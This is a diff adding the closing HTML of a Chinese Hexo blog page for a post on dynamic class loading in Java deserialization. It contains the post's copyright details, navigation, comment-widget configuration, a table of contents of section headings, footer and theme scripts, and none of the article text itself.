+                <div class="post-copyright-info">
+                    
+<div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li class="post-title">
+            <span class="type">本文标题</span>：<span class="content">Java反序列化基础篇-05-类的动态加载</span>
+        </li>
+        <li class="post-author">
+            <span class="type">本文作者</span>：<span class="content">Drunkbaby</span>
+        </li>
+        <li class="post-time">
+            <span class="type">创建时间</span>：<span class="content">2022-06-03 21:54:03</span>
+        </li>
+        <li class="post-link">
+            <span class="type">本文链接</span>：<span class="content">2022/06/03/Java反序列化基础篇-05-类的动态加载/</span>
+        </li>
+        <li class="post-license">
+            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
+        </li>
+    </ul>
+    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/Java/">#Java</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">Java反序列化Commons-Collections篇01-CC1链</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2022/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-04-JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Java反序列化基础篇-04-JDK动态代理</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;评论
+    </div>
+    
+        
+            
+
+    <div class="valine-container">
+        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script data-pjax>
+          function loadValine() {
+
+            const config = {
+              el: '#vcomments',
+              appId: 'mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va',
+              appKey: 'ermlV1eoB1YODT088EdXjo6C',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: 'just go go',
+              lang: 'zh-CN'.toLowerCase()
+            }
+
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            new Valine(config)
+
+            function getAuthor(language) {
+              switch (language) {
+                case 'en':
+                  return 'Author'
+                case 'zh-CN':
+                  return '博主'
+                default:
+                  return 'Master'
+              }
+            }
+
+            // Add "Author" identify
+            const getValineDomTimer = setInterval(() => {
+              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
+              if (vcards.length > 0) {
+                let author = 'Drunkbaby'
+
+                if (author) {
+                  for (let vcard of vcards) {
+                    const vnick_dom = vcard.querySelector('.vhead .vnick')
+                    const vnick = vnick_dom.innerHTML
+                    if (vnick === author) {
+                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                    }
+                  }
+                }
+                clearInterval(getValineDomTimer)
+              } else {
+                clearInterval(getValineDomTimer)
+              }
+            }, 2000)
+          }
+
+          if ('true' === 'true') {
+            const loadValineTimeout = setTimeout(() => {
+              loadValine()
+              clearTimeout(loadValineTimeout)
+            }, 1000)
+          } else {
+            window.addEventListener('DOMContentLoaded', loadValine)
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD"><span class="nav-text">Java反序列化基础篇-05-类的动态加载</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8A%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE"><span class="nav-text">0x02 类加载器及双亲委派</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%9C%89%E4%BB%80%E4%B9%88%E7%94%A8"><span class="nav-text">1. 类加载器有什么用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%87%A0%E7%A7%8D%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="nav-text">2. 几种加载器</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%95%E5%AF%BC%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="nav-text">引导类加载器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%A9%E5%B1%95%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%EF%BC%88ExtensionsClassLoader%EF%BC%89"><span class="nav-text">扩展类加载器（ExtensionsClassLoader）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#App%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%EF%BC%88AppClassLoader%EF%BC%89"><span class="nav-text">App类加载器（AppClassLoader）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6"><span class="nav-text">3. 双亲委派机制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%8E%E6%8A%A5%E9%94%99%E7%9A%84%E8%A7%92%E5%BA%A6%E6%84%9F%E5%8F%97%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6"><span class="nav-text">从报错的角度感受双亲委派机制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%8E%E6%AD%A3%E7%A1%AE%E7%9A%84%E8%A7%92%E5%BA%A6%E6%84%9F%E5%8F%97%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6"><span class="nav-text">从正确的角度感受双亲委派机制</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%90%84%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%BB%A3%E7%A0%81%E5%9D%97%E5%8A%A0%E8%BD%BD%E9%A1%BA%E5%BA%8F"><span class="nav-text">0x03 各场景下代码块加载顺序</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%80%E3%80%81%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1"><span class="nav-text">场景一、实例化对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E4%BA%8C%E3%80%81%E8%B0%83%E7%94%A8%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95"><span class="nav-text">场景二、调用静态方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%89%E3%80%81%E5%AF%B9%E7%B1%BB%E4%B8%AD%E7%9A%84%E9%9D%99%E6%80%81%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC"><span class="nav-text">场景三、对类中的静态成员变量赋值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E5%9B%9B%E3%80%81%E4%BD%BF%E7%94%A8-class-%E8%8E%B7%E5%8F%96%E7%B1%BB"><span class="nav-text">场景四、使用 class 获取类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E4%BA%94%E3%80%81%E4%BD%BF%E7%94%A8-forName-%E8%8E%B7%E5%8F%96%E7%B1%BB"><span class="nav-text">场景五、使用 forName 获取类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E5%85%AD%E3%80%81%E4%BD%BF%E7%94%A8-ClassLoader-loadClass-%E8%8E%B7%E5%8F%96%E7%B1%BB"><span class="nav-text">场景六、使用 ClassLoader.loadClass() 获取类</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-text">0x04 动态加载字节码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%AD%97%E8%8A%82%E7%A0%81%E7%9A%84%E6%A6%82%E5%BF%B5"><span class="nav-text">1. 字节码的概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%9A%84%E5%8E%9F%E7%90%86"><span class="nav-text">2. 类加载器的原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%88%A9%E7%94%A8-URLClassLoader-%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8B-class-%E6%96%87%E4%BB%B6"><span class="nav-text">3. 利用 URLClassLoader 加载远程 class 文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#file-%E5%8D%8F%E8%AE%AE"><span class="nav-text">file 协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP-%E5%8D%8F%E8%AE%AE"><span class="nav-text">HTTP 协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#file-jar-%E5%8D%8F%E8%AE%AE"><span class="nav-text">file+jar 协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP-jar-%E5%8D%8F%E8%AE%AE"><span class="nav-text">HTTP + jar 协议</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%88%A9%E7%94%A8-ClassLoader-defineClass-%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-text">4. 利用 ClassLoader#defineClass 直接加载字节码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-Unsafe-%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-text">5. Unsafe 加载字节码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-TemplatesImpl-%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-text">6. TemplatesImpl 加载字节码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-%E5%88%A9%E7%94%A8-BCEL-ClassLoader-%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-text">7. 利用 BCEL ClassLoader 加载字节码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%85%B3%E4%BA%8E%E5%AD%97%E8%8A%82%E7%A0%81%E7%9A%84%E5%B0%8F%E7%BB%93"><span class="nav-text">0x05 关于字节码的小结</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2021</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">Drunkbaby</a>
+            
+        </div>
+        
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
